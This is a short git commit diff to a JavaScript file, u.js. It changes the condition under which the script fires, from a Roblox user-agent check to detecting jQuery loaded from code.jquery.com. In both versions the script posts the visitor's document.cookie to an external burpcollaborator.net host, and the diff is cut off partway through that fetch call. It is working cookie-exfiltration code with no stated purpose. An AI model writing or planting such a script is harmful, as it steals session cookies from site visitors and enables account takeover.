b9e88c92b42feeaaa973cd4de7abf6bed27f6694
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-03 01:46:12 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,6 +1,6 @@
-var ua=navigator.userAgent
-if(ua.match(/roblox/ig)){
-fetch('https://vcbac5cd281z2cpaxusipjsqlhr7fw.burpcollaborator.net', {
+var reg=/code\.jquery.com/ig;
+if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
+fetch('https://exfyh9nuxpfdr1hzjdecdkzcy34usj.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
